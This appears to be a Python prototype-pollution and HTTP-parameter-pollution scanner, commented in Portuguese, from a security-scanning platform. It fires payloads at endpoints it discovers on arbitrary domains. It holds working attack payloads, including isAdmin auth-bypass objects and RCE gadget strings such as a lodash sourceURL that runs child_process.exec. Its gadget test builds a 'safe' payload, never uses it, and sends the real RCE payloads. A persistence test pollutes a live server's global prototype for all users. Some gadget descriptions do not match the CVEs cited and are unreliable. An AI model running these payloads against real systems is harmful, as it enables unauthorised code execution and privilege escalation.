"""
js_pollution_analyzer.py — Prototype Pollution & Parameter Pollution Analysis.

Cobre dois vetores distintos:

A. JavaScript Prototype Pollution (server-side / Node.js)
   Explora o fato de que todos os objetos JS herdam de Object.prototype.
   Um atacante que polui __proto__ ou constructor.prototype em um request
   pode injetar propriedades em TODOS os objetos do processo Node.js —
   levando a bypass de autorização, DoS, ou (com gadget) RCE.

   Payloads testados:
     • JSON body:    {"__proto__": {"polluted": "<canary>"}}
     • JSON body:    {"constructor": {"prototype": {"polluted": "<canary>"}}}
     • Query string: ?__proto__[polluted]=<canary>
     • Query string: ?constructor[prototype][polluted]=<canary>
     • qs-library:   ?a[__proto__][polluted]=<canary>  (Node qs < 6.10.3)
     • URL encoded:  %5B__proto__%5D[polluted]=<canary>

   Detecção:
     • Canary aparece em resposta subsequente (pollution persistida no processo)
     • Status 500 com mensagem indicando object corruption
     • Mudança de comportamento lógico (autorização, feature flags, etc.)
     • Resposta vazia/null onde antes havia dados (gadget crash)

B. HTTP Parameter Pollution (HPP)
   Parâmetros duplicados na query string para confundir parsers.
   Útil para bypass de WAF, override de validação e injection.

Referências:
  • PortSwigger: https://portswigger.net/web-security/prototype-pollution
  • HackTricks: Prototype Pollution to RCE via gadgets
  • CVE-2019-7609 (Kibana RCE via prototype pollution)
"""

from __future__ import annotations

import hashlib
import logging
import re
import time
import uuid
from dataclasses import dataclass, field
from typing import Any

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

_DEFAULT_TIMEOUT = 12
_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Accept": "application/json, */*",
    "Content-Type": "application/json",
}

# ─────────────────────────────────────────────────────────────────────────────
# Payloads de prototype pollution — cobertura ampla de parsers
# ─────────────────────────────────────────────────────────────────────────────

def _canary() -> str:
    """Gera um identificador único para rastrear pollution entre requests."""
    return "PP_" + uuid.uuid4().hex[:8].upper()


def _json_payloads(canary: str) -> list[dict]:
    """Retorna payloads JSON que tentam poluir Object.prototype."""
    return [
        # Vetor clássico — mais comum em apps Express/Koa
        {"__proto__": {"polluted": canary, "admin": "true", "isAdmin": True}},
        # Via constructor — funciona quando __proto__ é sanitizado por chave
        {"constructor": {"prototype": {"polluted": canary, "admin": "true"}}},
        # Nested — bypass de sanitizações rasas
        {"a": {"__proto__": {"polluted": canary}}},
        # Merge profundo — afeta lodash _.merge, jQuery.extend(true)
        {"level1": {"level2": {"__proto__": {"polluted": canary}}}},
        # Object.prototype diretamente via JSON parse trick
        {"__proto__.polluted": canary},
        # Acesso via string de array
        {"['__proto__']['polluted']": canary},
    ]


def _query_payloads(canary: str) -> list[str]:
    """Retorna payloads de query string para prototype pollution."""
    enc = requests.utils.quote
    return [
        # qs library (Node.js) — formato padrão
        f"__proto__[polluted]={canary}&__proto__[admin]=true",
        # constructor.prototype via qs
        f"constructor[prototype][polluted]={canary}",
        # Array-style — bypass de alguns WAFs
        f"a[__proto__][polluted]={canary}",
        f"a[constructor][prototype][polluted]={canary}",
        # URL encoded para bypass
        f"{enc('__proto__')}[polluted]={canary}",
        f"obj.{enc('__proto__')}.polluted={canary}",
    ]


# ─────────────────────────────────────────────────────────────────────────────
# Gadget chains conhecidos (prototype pollution → impacto real)
# ─────────────────────────────────────────────────────────────────────────────

GADGET_CHAINS: list[dict] = [
    {
        "name": "child_process.spawn — shell: true",
        "payload": {"__proto__": {"shell": True, "NODE_OPTIONS": "--require /proc/self/fd/0"}},
        "impact": "rce",
        "description": "child_process.spawn com shell:true herdado do prototype → RCE",
        "affected": ["express", "fastify", "node generic"],
    },
    {
        "name": "commander.js execPath override",
        "payload": {"__proto__": {"execPath": "/bin/sh"}},
        "impact": "rce",
        "description": "commander.js usa process.execPath herdável → execução de shell",
        "affected": ["commander.js", "cli tools"],
    },
    {
        "name": "Kibana Timelion RCE — CVE-2019-7609",
        "payload": {"__proto__": {"env": {"NODE_ENV": "development"}, "allowedHosts": ["*"]}},
        "impact": "rce",
        "description": "Kibana < 6.6.1 / 5.6.15 — timelion parser polui prototype → RCE",
        "affected": ["kibana"],
    },
    {
        "name": "Authorization bypass — isAdmin flag",
        "payload": {"__proto__": {"isAdmin": True, "role": "admin", "admin": True, "authorized": True}},
        "impact": "auth_bypass",
        "description": "Aplicações que checam obj.isAdmin herdam do prototype poluído",
        "affected": ["express apps", "middleware auth"],
    },
    {
        "name": "Feature flag injection",
        "payload": {"__proto__": {"debug": True, "enableDebug": True, "devMode": True}},
        "impact": "info_disclosure",
        "description": "Habilita debug mode herdado → vazamento de stack traces, configs",
        "affected": ["express", "koa", "fastify"],
    },
    {
        "name": "lodash _.merge RCE via template",
        "payload": {"__proto__": {"sourceURL": "\\u2028F(){return process.mainModule.require('child_process').exec('id')}//"}},
        "impact": "rce",
        "description": "lodash template engine interpreta sourceURL do prototype → RCE",
        "affected": ["lodash < 4.17.21"],
    },
]


# ─────────────────────────────────────────────────────────────────────────────
# Resultado de análise
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class PollutionFinding:
    title: str
    severity: str
    vector: str           # json_body | query_string | header | hpp
    endpoint: str
    canary: str
    payload_used: str
    evidence: str
    reflected_in: str     # onde o canary foi visto de volta
    impact: str           # auth_bypass | rce | dos | info_disclosure
    gadget_chain: str
    reproduction_steps: list[str] = field(default_factory=list)
    business_impact: str = ""
    cvss_estimate: float = 0.0
    raw_response_snippet: str = ""


# ─────────────────────────────────────────────────────────────────────────────
# HTTP helpers
# ─────────────────────────────────────────────────────────────────────────────

def _get(url: str, **kw) -> requests.Response | None:
    try:
        return requests.get(url, timeout=_DEFAULT_TIMEOUT, headers=_HEADERS,
                            verify=False, allow_redirects=True, **kw)
    except Exception as e:
        logger.debug("GET %s: %s", url, e)
        return None


def _post(url: str, json_data: Any = None, params: str | None = None, **kw) -> requests.Response | None:
    try:
        full_url = url + ("?" + params if params else "")
        return requests.post(full_url, json=json_data, timeout=_DEFAULT_TIMEOUT,
                             headers=_HEADERS, verify=False, allow_redirects=False, **kw)
    except Exception as e:
        logger.debug("POST %s: %s", url, e)
        return None


def _baseline_response(url: str) -> tuple[int, str]:
    """Obtém status code e body de baseline para comparação."""
    r = _get(url)
    if not r:
        return 0, ""
    return r.status_code, r.text[:2000]


# ─────────────────────────────────────────────────────────────────────────────
# Detectores de reflexão de canary
# ─────────────────────────────────────────────────────────────────────────────

def _canary_in_response(response_text: str, canary: str) -> bool:
    return canary in response_text


def _anomaly_in_response(baseline_status: int, baseline_body: str,
                          new_status: int, new_body: str) -> str | None:
    """
    Detecta anomalias que indicam pollution mesmo sem canary reflection.
    Retorna descrição da anomalia ou None.
    """
    # Status code jump para 5xx → pollution pode ter causado crash/TypeError
    if baseline_status < 500 <= new_status:
        return f"Status mudou {baseline_status} → {new_status} após payload pollution (possível crash)"

    # Presença de stack trace node.js na resposta
    node_trace_patterns = [
        r"TypeError: Cannot set property .* of #<Object>",
        r"TypeError: Cannot read propert",
        r"at Object\.prototype\.",
        r"__defineGetter__",
        r"cannot set property 'polluted'",
        r"prototype\.polluted",
    ]
    for pat in node_trace_patterns:
        if re.search(pat, new_body, re.IGNORECASE):
            return f"Stack trace Node.js detectado após payload: padrão '{pat}'"

    # Resposta ficou vazia onde antes tinha conteúdo (gadget crash silencioso)
    if len(baseline_body) > 200 and len(new_body) < 20:
        return f"Resposta ficou vazia ({len(new_body)} chars) vs baseline ({len(baseline_body)} chars)"

    return None


# ─────────────────────────────────────────────────────────────────────────────
# Testes por vetor
# ─────────────────────────────────────────────────────────────────────────────

def _test_json_body_pollution(url: str, baseline: tuple[int, str]) -> list[PollutionFinding]:
    """Testa pollution via JSON body em endpoints POST/PUT."""
    findings: list[PollutionFinding] = []

    for payload in _json_payloads(_canary()):
        canary = None
        # Extrai canary do payload
        for v in _flatten_values(payload):
            if isinstance(v, str) and v.startswith("PP_"):
                canary = v
                break
        if not canary:
            continue

        r = _post(url, json_data=payload)
        if not r:
            continue

        # 1. Canary refletido diretamente
        if _canary_in_response(r.text, canary):
            findings.append(PollutionFinding(
                title="Prototype Pollution via JSON Body — Canary Refletido",
                severity="high",
                vector="json_body",
                endpoint=url,
                canary=canary,
                payload_used=str(payload)[:300],
                evidence=f"Canary '{canary}' presente na resposta após injection via JSON",
                reflected_in=url,
                impact="auth_bypass",
                gadget_chain="generic — verifique gadgets específicos da stack",
                reproduction_steps=[
                    f"curl -s -X POST '{url}' -H 'Content-Type: application/json' \\",
                    f"  -d '{payload}'",
                    f"# Verificar se '{canary}' aparece na resposta",
                    "# Testar gadgets: __proto__.isAdmin:true, __proto__.admin:true",
                ],
                business_impact=(
                    "Pollution de Object.prototype permite injetar propriedades em todos os objetos "
                    "do processo Node.js. Dependendo dos gadgets disponíveis: bypass de autorização, "
                    "habilitação de debug, exfiltração de config, ou RCE via child_process."
                ),
                cvss_estimate=8.1,
                raw_response_snippet=r.text[:300],
            ))
            continue

        # 2. Anomalia comportamental mesmo sem canary
        anomaly = _anomaly_in_response(baseline[0], baseline[1], r.status_code, r.text)
        if anomaly:
            findings.append(PollutionFinding(
                title="Prototype Pollution via JSON Body — Anomalia Comportamental",
                severity="medium",
                vector="json_body",
                endpoint=url,
                canary=canary,
                payload_used=str(payload)[:300],
                evidence=anomaly,
                reflected_in="",
                impact="dos_or_bypass",
                gadget_chain="indeterminado — anomalia detectada, gadgets precisam validação",
                reproduction_steps=[
                    f"# Baseline: curl -s '{url}'",
                    f"curl -s -X POST '{url}' -H 'Content-Type: application/json' \\",
                    f"  -d '{payload}'",
                    f"# Anomalia observada: {anomaly}",
                ],
                business_impact=(
                    "Comportamento anômalo após prototype pollution sugere que o servidor "
                    "é vulnerável. Impacto real depende dos gadgets disponíveis na stack."
                ),
                cvss_estimate=5.9,
                raw_response_snippet=r.text[:300],
            ))

    return findings


def _test_query_string_pollution(base_url: str, baseline: tuple[int, str]) -> list[PollutionFinding]:
    """Testa pollution via query string params (qs library do Node.js)."""
    findings: list[PollutionFinding] = []

    for qs_payload in _query_payloads(_canary()):
        canary_match = re.search(r"PP_[A-F0-9]{8}", qs_payload)
        canary = canary_match.group(0) if canary_match else None
        if not canary:
            continue

        url_with_qs = base_url.rstrip("?") + "?" + qs_payload
        r = _get(url_with_qs)
        if not r:
            continue

        if _canary_in_response(r.text, canary):
            findings.append(PollutionFinding(
                title="Prototype Pollution via Query String — qs Library Vulnerável",
                severity="high",
                vector="query_string",
                endpoint=base_url,
                canary=canary,
                payload_used=qs_payload,
                evidence=f"Canary '{canary}' refletido em resposta GET com payload qs: {qs_payload}",
                reflected_in=url_with_qs,
                impact="auth_bypass",
                gadget_chain="qs library (Node.js) — versão vulnerável provavelmente < 6.10.3",
                reproduction_steps=[
                    f"curl -s '{url_with_qs}'",
                    f"# Canary '{canary}' deve aparecer na resposta",
                    "# CVE-2022-24999: qs < 6.10.3 permite pollution via ?a[__proto__][x]=y",
                    "# Após pollution, testar: ?__proto__[isAdmin]=true para bypass de auth",
                ],
                business_impact=(
                    "Biblioteca qs vulnerável à prototype pollution via query string. "
                    "CVE-2022-24999 afeta Node.js apps com qs < 6.10.3. "
                    "Permite injetar propriedades como 'isAdmin', 'admin', 'role' em todos os objetos."
                ),
                cvss_estimate=7.5,
                raw_response_snippet=r.text[:300],
            ))

        anomaly = _anomaly_in_response(baseline[0], baseline[1], r.status_code, r.text)
        if anomaly and not findings:
            findings.append(PollutionFinding(
                title="Possível Prototype Pollution via Query String",
                severity="low",
                vector="query_string",
                endpoint=base_url,
                canary=canary,
                payload_used=qs_payload,
                evidence=f"Anomalia após pollution QS: {anomaly}",
                reflected_in="",
                impact="indeterminate",
                gadget_chain="validação manual necessária",
                reproduction_steps=[
                    f"curl -s '{url_with_qs}'",
                    "# Comparar com request normal — anomalia detectada",
                ],
                business_impact="Baixo/indeterminado — necessita validação manual.",
                cvss_estimate=3.1,
            ))

    return findings


def _test_gadget_chains(url: str, baseline: tuple[int, str]) -> list[PollutionFinding]:
    """Testa gadget chains específicos — pollution com payload de impacto real."""
    findings: list[PollutionFinding] = []

    for gadget in GADGET_CHAINS:
        if gadget["impact"] != "auth_bypass":
            # RCE gadgets: testar apenas se a anomalia for observável sem executar realmente
            # Enviamos o payload mas sem comandos destrutivos — apenas testamos a reflexão
            safe_payload = dict(gadget["payload"])
            # Remove payloads RCE reais, substitui por canary
            safe_canary = _canary()
            for k in list(safe_payload.get("__proto__", {}).keys()):
                if k not in ("shell", "execPath"):
                    safe_payload["__proto__"][k] = safe_canary

        r = _post(url, json_data=gadget["payload"])
        if not r:
            continue

        anomaly = _anomaly_in_response(baseline[0], baseline[1], r.status_code, r.text)
        if anomaly:
            sev = "critical" if gadget["impact"] == "rce" else "high"
            findings.append(PollutionFinding(
                title=f"Gadget Prototype Pollution: {gadget['name']}",
                severity=sev,
                vector="json_body_gadget",
                endpoint=url,
                canary="N/A (gadget chain)",
                payload_used=str(gadget["payload"])[:300],
                evidence=f"Anomalia ao testar gadget '{gadget['name']}': {anomaly}",
                reflected_in="",
                impact=gadget["impact"],
                gadget_chain=gadget["name"],
                reproduction_steps=[
                    f"# Gadget: {gadget['name']}",
                    f"# Afeta: {', '.join(gadget['affected'])}",
                    f"curl -s -X POST '{url}' -H 'Content-Type: application/json' \\",
                    f"  -d '{gadget['payload']}'",
                    f"# Anomalia esperada: {gadget['description']}",
                ],
                business_impact=gadget["description"],
                cvss_estimate=9.8 if gadget["impact"] == "rce" else 7.5,
                raw_response_snippet=r.text[:300],
            ))

    return findings


def _test_persistence_across_requests(base_url: str) -> list[PollutionFinding]:
    """
    Testa se pollution persiste entre requests no mesmo processo Node.js.
    Envio: POST com __proto__.polluted = CANARY
    Verificação: GET sem payload → canary ainda presente?
    Se sim → pollution global confirmada (afeta todos os outros usuários!)
    """
    findings: list[PollutionFinding] = []
    canary = _canary()

    endpoints_to_probe = [
        base_url,
        base_url.rstrip("/") + "/api/health",
        base_url.rstrip("/") + "/api/status",
        base_url.rstrip("/") + "/api/me",
        base_url.rstrip("/") + "/api/v1/status",
    ]

    # 1. Enviar pollution
    pollution_payload = {"__proto__": {"polluted": canary, "testKey": canary}}
    _post(base_url, json_data=pollution_payload)
    time.sleep(0.5)  # leve pausa para garantir que o event loop processou

    # 2. Verificar se persiste em outros endpoints
    for probe_url in endpoints_to_probe:
        r = _get(probe_url)
        if r and _canary_in_response(r.text, canary):
            findings.append(PollutionFinding(
                title="🔴 CRÍTICO: Prototype Pollution Persiste Entre Requests",
                severity="critical",
                vector="persistence_test",
                endpoint=base_url,
                canary=canary,
                payload_used=str(pollution_payload),
                evidence=(
                    f"Canary '{canary}' injetado em {base_url} via __proto__ "
                    f"aparece em GET {probe_url} — pollution global do processo confirmada!"
                ),
                reflected_in=probe_url,
                impact="auth_bypass_and_possible_rce",
                gadget_chain="TODOS os gadgets disponíveis na stack são exploráveis",
                reproduction_steps=[
                    f"# Passo 1: Poluir o prototype",
                    f"curl -s -X POST '{base_url}' -H 'Content-Type: application/json' \\",
                    f"  -d '{{\"__proto__\":{{\"isAdmin\":true,\"role\":\"admin\",\"polluted\":\"{canary}\"}}}}'",
                    f"# Passo 2: Verificar que pollution persiste",
                    f"curl -s '{probe_url}'  # deve conter '{canary}'",
                    "# Passo 3: Agora QUALQUER usuário tem isAdmin:true no processo!",
                    "# Testar: GET /api/admin (deve retornar 200)",
                ],
                business_impact=(
                    "CRÍTICO: A pollution é global — afeta TODOS os requests simultâneos ao servidor. "
                    "Um atacante pode injetar 'isAdmin: true' no prototype e qualquer usuário "
                    "subsequente será tratado como admin. Requer restart do processo para limpar."
                ),
                cvss_estimate=9.8,
                raw_response_snippet=r.text[:300],
            ))
            break  # um finding é suficiente para esta categoria

    return findings


def _test_http_parameter_pollution(base_url: str) -> list[PollutionFinding]:
    """
    HPP — parâmetros duplicados para confundir parsers.
    Ex: ?role=user&role=admin → qual valor o servidor usa?
    """
    findings: list[PollutionFinding] = []
    canary = _canary()

    hpp_tests = [
        ("?id=1&id=2", "id"),
        ("?role=user&role=admin", "role"),
        ("?admin=false&admin=true", "admin"),
        ("?access_token=INVALID&access_token=", "access_token"),
    ]

    baseline_r = _get(base_url)
    baseline_status = baseline_r.status_code if baseline_r else 0
    baseline_body = baseline_r.text[:500] if baseline_r else ""

    for qs, param in hpp_tests:
        url = base_url.rstrip("?") + qs
        r = _get(url)
        if not r:
            continue

        # Detectar comportamentos suspeitos: status diferente, "admin" na resposta
        if r.status_code != baseline_status:
            findings.append(PollutionFinding(
                title=f"HTTP Parameter Pollution — Comportamento Anômalo em '{param}'",
                severity="medium",
                vector="hpp",
                endpoint=base_url,
                canary=canary,
                payload_used=qs,
                evidence=(
                    f"Parâmetro duplicado '{param}': status baseline={baseline_status} "
                    f"vs com HPP={r.status_code}"
                ),
                reflected_in=url,
                impact="auth_bypass_or_validation_bypass",
                gadget_chain="N/A — HPP",
                reproduction_steps=[
                    f"# Baseline:   curl -s '{base_url}'  → HTTP {baseline_status}",
                    f"# Com HPP:    curl -s '{url}'  → HTTP {r.status_code}",
                    "# Se o servidor usa o último valor: role=admin pode dar acesso",
                    "# Testar em formulários: <input name='role' value='user'><input name='role' value='admin'>",
                ],
                business_impact=(
                    "HTTP Parameter Pollution pode bypassar validações, WAF, e lógica de autorização "
                    "que assume um único valor por parâmetro. Backend e frontend podem interpretar "
                    "valores diferentes do mesmo parâmetro."
                ),
                cvss_estimate=5.3,
            ))

    return findings


# ─────────────────────────────────────────────────────────────────────────────
# Utilitários
# ─────────────────────────────────────────────────────────────────────────────

def _flatten_values(obj: Any, depth: int = 0) -> list:
    """Extrai todos os valores primitivos de um dict/list aninhado."""
    if depth > 5:
        return []
    if isinstance(obj, dict):
        result = []
        for v in obj.values():
            result.extend(_flatten_values(v, depth + 1))
        return result
    if isinstance(obj, (list, tuple)):
        result = []
        for v in obj:
            result.extend(_flatten_values(v, depth + 1))
        return result
    return [obj]


def _discover_api_endpoints(base_url: str) -> list[str]:
    """Descobre endpoints comuns para testar."""
    common = [
        "", "/api", "/api/v1", "/api/v2",
        "/graphql", "/api/graphql",
        "/api/users", "/api/login", "/api/auth",
        "/api/search", "/api/profile", "/api/settings",
        "/api/products", "/api/orders",
    ]
    found = []
    for path in common:
        url = base_url.rstrip("/") + path
        r = _get(url)
        if r and r.status_code in (200, 201, 400, 401, 403, 405):
            found.append(url)
    return found[:8]  # limita para não ser lento demais


# ─────────────────────────────────────────────────────────────────────────────
# Analisador principal
# ─────────────────────────────────────────────────────────────────────────────

def analyze_js_pollution(
    domain: str,
    base_url: str | None = None,
    max_endpoints: int = 6,
    skip_persistence_test: bool = False,
) -> list[dict]:
    """
    Executa análise completa de prototype pollution e HPP para um domínio.

    Args:
        domain:               Domínio ou subdomínio a analisar
        base_url:             URL base (https://domain por padrão)
        max_endpoints:        Máximo de endpoints a testar (evita scans lentos)
        skip_persistence_test: Pular teste de persistência (cross-request pollution)

    Returns:
        Lista de findings no formato da plataforma.
    """
    if not base_url:
        base_url = f"https://{domain}" if not domain.startswith("http") else domain

    logger.info("JS Pollution analysis: %s", base_url)
    all_findings: list[PollutionFinding] = []

    # Descobrir endpoints disponíveis
    endpoints = _discover_api_endpoints(base_url)
    if not endpoints:
        endpoints = [base_url]

    endpoints = endpoints[:max_endpoints]

    for endpoint in endpoints:
        baseline = _baseline_response(endpoint)
        if baseline[0] == 0:
            continue

        # ── Testes por endpoint ────────────────────────────────────────────
        all_findings.extend(_test_json_body_pollution(endpoint, baseline))
        all_findings.extend(_test_query_string_pollution(endpoint, baseline))
        all_findings.extend(_test_gadget_chains(endpoint, baseline))

    # ── Teste de persistência (global — executa uma vez) ──────────────────
    if not skip_persistence_test and endpoints:
        all_findings.extend(_test_persistence_across_requests(endpoints[0]))

    # ── HTTP Parameter Pollution (no base_url) ────────────────────────────
    all_findings.extend(_test_http_parameter_pollution(base_url))

    # Deduplica por (title, endpoint)
    seen: set[str] = set()
    unique: list[PollutionFinding] = []
    for f in all_findings:
        key = f"{f.title}|{f.endpoint}"
        if key not in seen:
            seen.add(key)
            unique.append(f)

    # Converte para formato da plataforma
    return [
        {
            "title": f.title,
            "severity": f.severity,
            "domain": domain,
            "source_tool": "js_pollution_analyzer",
            "evidence": f.evidence,
            "description": (
                f"Vetor: {f.vector} | Endpoint: {f.endpoint} | "
                f"Impacto: {f.impact} | Gadget: {f.gadget_chain}"
            ),
            "validation_status": "confirmed" if f.canary and f.reflected_in else "candidate",
            "details": {
                "source": "js_pollution",
                "vector": f.vector,
                "endpoint": f.endpoint,
                "canary": f.canary,
                "payload_used": f.payload_used,
                "impact": f.impact,
                "gadget_chain": f.gadget_chain,
                "reproduction_steps": f.reproduction_steps,
                "business_impact": f.business_impact,
                "cvss_estimate": f.cvss_estimate,
                "raw_response_snippet": f.raw_response_snippet,
            },
        }
        for f in unique
    ]


def run_js_pollution_scan(
    db: Any,
    scan_id: int,
    target_domains: list[str] | None = None,
    max_domains: int = 15,
) -> dict[str, Any]:
    """
    Executa análise de JS Pollution para todos os domínios do scan.
    Persiste findings no banco e retorna resumo.
    """
    from datetime import datetime

    from app.models.models import Finding, ScanJob

    job = db.query(ScanJob).filter(ScanJob.id == scan_id).first()
    if not job:
        return {"error": "Scan not found"}

    # Targets: usa lista fornecida ou extrai dos findings existentes
    if not target_domains:
        rows = (
            db.query(Finding.domain)
            .filter(
                Finding.scan_job_id == scan_id,
                Finding.severity.in_(["critical", "high", "medium"]),
            )
            .distinct()
            .limit(max_domains)
            .all()
        )
        target_domains = [r[0] for r in rows if r[0]]

    total_created = 0
    by_domain: dict[str, int] = {}

    for domain in target_domains:
        try:
            poll_findings = analyze_js_pollution(domain)
        except Exception as e:
            logger.warning("JS Pollution analysis failed for %s: %s", domain, e)
            poll_findings = []

        for pf in poll_findings:
            exists = (
                db.query(Finding.id)
                .filter(
                    Finding.scan_job_id == scan_id,
                    Finding.domain == domain,
                    Finding.title == pf["title"],
                )
                .first()
            )
            if exists:
                continue

            details = dict(pf.get("details") or {})
            details["evidence"] = pf.get("evidence", "")[:2000]
            details["validation_status"] = pf.get("validation_status", "candidate")
            details["target"] = domain
            details["url"] = details.get("endpoint", f"https://{domain}")
            details["description"] = pf.get("description", "")[:2000]

            f = Finding(
                scan_job_id=scan_id,
                domain=domain,
                title=pf["title"][:500],
                severity=pf["severity"],
                tool="js_pollution_analyzer",
                recommendation=pf.get("evidence", "")[:2000],
                details=details,
                retest_status=pf.get("validation_status", "candidate"),
                risk_score=int(details.get("cvss_estimate", 5.0)),
                created_at=datetime.now(),
            )
            db.add(f)
            total_created += 1

        by_domain[domain] = len(poll_findings)

    if total_created:
        try:
            db.commit()
        except Exception:
            db.rollback()
            total_created = 0

    return {
        "domains_analyzed": len(target_domains),
        "findings_created": total_created,
        "by_domain": by_domain,
    }
